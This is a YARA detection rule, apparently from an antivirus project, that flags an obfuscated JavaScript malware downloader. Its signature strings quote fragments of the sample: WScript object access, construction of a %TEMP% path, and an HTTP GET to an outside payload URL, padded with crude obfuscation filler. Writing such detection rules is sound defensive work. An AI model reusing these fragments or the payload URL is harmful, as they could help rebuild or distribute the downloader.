rule sig_20160428_904c3db805f1cad981cbc50552d74215 {
  meta:
    description = "datamaliciousorder - file 20160428_904c3db805f1cad981cbc50552d74215.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2bdb9a099ebe69cd27bb3da0c3e9062b180e9cbc7a001167ba3149e1d0422427"

  strings:
    $s1  = "function FjkFdpDztRnpXfmUwjGwg(MtnQzkUokUycZdpGyrKrz){SuyUtyIdjYhgIbpIhlJff[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FjkFdpDztRnpXfmUwjGwg(MtnQzkUokUycZdpGyrKrz){SuyUtyIdjYhgIbpIhlJff[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AbmWupGgbBmvDfiRnsWlb() {return SuyUtyIdjYhgIbpIhlJff[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return GgkFisBdhTocHauYepPjy - DerStfZuqVynNokUyeHkj;};" fullword ascii
    $s5  = "var SuyUtyIdjYhgIbpIhlJff = function QisZynVwjJtbGveGyvBzn() {return LppJgqUhlGrsNsrQhsAfh[NepOadYnxYlsKcjJvxIht](\"WScript\"+\"" ascii
    $s6  = "VypAlfFglLbuXvjAhqPkw[KxyLxrCavQqqQzbIllSdl](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s7  = "function BskEukEcvKqcBowHzhTio(GgkFisBdhTocHauYepPjy, DerStfZuqVynNokUyeHkj){GogYufTukHhfVhoSovNfz = GogYufTukHhfVhoSovNfz * 1; " ascii
    $s8  = "var SuyUtyIdjYhgIbpIhlJff = function QisZynVwjJtbGveGyvBzn() {return LppJgqUhlGrsNsrQhsAfh[NepOadYnxYlsKcjJvxIht](\"WScript\"+\"" ascii
    $s9  = "var LppJgqUhlGrsNsrQhsAfh = this[\"WScript\"];" fullword ascii
    $s10 = "function AbmWupGgbBmvDfiRnsWlb() {return SuyUtyIdjYhgIbpIhlJff[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (VypAlfFglLbuXvjAhqPkw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function BskEukEcvKqcBowHzhTio(GgkFisBdhTocHauYepPjy, DerStfZuqVynNokUyeHkj){GogYufTukHhfVhoSovNfz = GogYufTukHhfVhoSovNfz * 1; " ascii
    $s13 = "function WgcWnhFjwGebKjsVfuYcz(){return LtfFzzOhxLltTfvWheWjq + \"\";};" fullword ascii
    $s14 = "function PmmCveFjaSxxPmpZlyTxv() {return ((PchExhSlqTgyGppTjiSpv == true) && (PchExhSlqTgyGppTjiSpv == FkgXbwOcqGxgQspQgaZzf)) ?" ascii
    $s15 = "function PmmCveFjaSxxPmpZlyTxv() {return ((PchExhSlqTgyGppTjiSpv == true) && (PchExhSlqTgyGppTjiSpv == FkgXbwOcqGxgQspQgaZzf)) ?" ascii
    $s16 = "function PjhLunSyxKhsMngDndLeh(){return NepOadYnxYlsKcjJvxIht;};" fullword ascii
    $s17 = "function EraPkfGobUnbYuwZkiAtm(YerFydFadFblIxyVbyBwd) {var SgsQwbKtjAjvUgtXcxCne = (1, 2, 3, 4, 5, YerFydFadFblIxyVbyBwd); retur" ascii
    $s18 = "function NbxSsmRtlJfyEhuJwtHus()" fullword ascii
    $s19 = "function EraPkfGobUnbYuwZkiAtm(YerFydFadFblIxyVbyBwd) {var SgsQwbKtjAjvUgtXcxCne = (1, 2, 3, 4, 5, YerFydFadFblIxyVbyBwd); retur" ascii
    $s20 = "function AijZjoQcxMotLqzHgqQol(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}